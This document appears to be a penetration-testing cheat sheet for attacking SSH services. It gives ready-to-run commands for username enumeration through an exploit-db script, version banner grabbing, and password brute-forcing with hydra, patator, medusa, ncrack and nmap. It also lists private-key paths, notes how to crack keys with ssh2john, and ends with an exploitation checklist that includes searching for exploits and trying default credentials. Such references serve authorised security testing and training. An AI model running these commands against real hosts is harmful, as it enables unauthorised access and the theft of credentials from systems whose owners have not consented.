### User enumeration

	python /usr/share/exploitdb/exploits/linux/remote/40136.py -U /usr/share/wordlists/metasploit/unix_users.txt $ip

### Banner grabbing

	nmap -sV -p T:22 $ip

### Vulnerable Versions

	7.2p1

### Connection

#### Connect to SSH

	ssh <user name>@$ip

#### Connect to SSH with private key
	ssh –i key <user name>@$ip

### Brute-force

#### Patator

	patator ssh_login host=$ip user=FILE0 0=user.txt password=FILE1 1=pass.txt

#### Hydra

Known username

	hydra -l root -P pass.txt $ip ssh -v -V -F

Username and password attack

	hydra -L user.txt -P pass.txt $ip ssh

#### Medusa

	medusa -h $ip -U user.txt -P pass.txt -M ssh

#### Ncrack

	ncrack –v –U user.txt –P pass.txt $ip:22

#### Nmap

	nmap -p 22 –script ssh-brute –script-args userdb=users.lst,passdb=pass.lst –script-args ssh-brute.timeout=4s $ip

### Path of id_rsa

	$user/.ssh/id_rsa
	$user/.ssh/authorized key

### Crack id_rsa

	/usr/share/john/ssh2john.py

### Configuration files

	ssh_config
	sshd_config
	authorized_keys
	ssh_known_hosts
	.shosts

### Exploitation
- Gather version numbers    
- Searchsploit
- Default Creds
- Creds previously gathered
- Download the software